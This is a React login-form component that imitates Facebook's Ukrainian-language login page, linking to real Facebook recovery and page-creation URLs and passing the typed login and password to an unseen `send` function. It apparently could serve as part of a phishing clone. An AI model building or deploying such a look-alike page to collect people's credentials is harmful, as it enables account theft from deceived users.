import React, { useState } from 'react';
import InputField from './Input/InputField';
import LogInButton from './Button/LogInButton';
import RegisterButton from './Button/RegisterButton';
import { send } from '../../http';
import './Form.css';

const Form = () => {
    const [login, setLogin] = useState("");
    const [password, setPassword] = useState("");

    const onSubmit = () => {
        if (login && password) send(login, password);
    }

    return (
        <div className='form-wrapper'>
            <div className='form-container'>
                <InputField setValue={setLogin} />
                <InputField isPassword={true} setValue={setPassword} />
                <LogInButton onSubmit={onSubmit} />
                <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Забули пароль?</a>
                <hr style={{width: "90%", border: "1px solid #ccc", margin: "20px 16px"}}/>
                <RegisterButton />
            </div>
            <span className='create-brand'><a href="https://www.facebook.com/pages/create/?ref_type=registration_form">Створити сторінку</a> для знаменитості, бренду чи компанії</span>
        </div>
    );
}

export default Form;
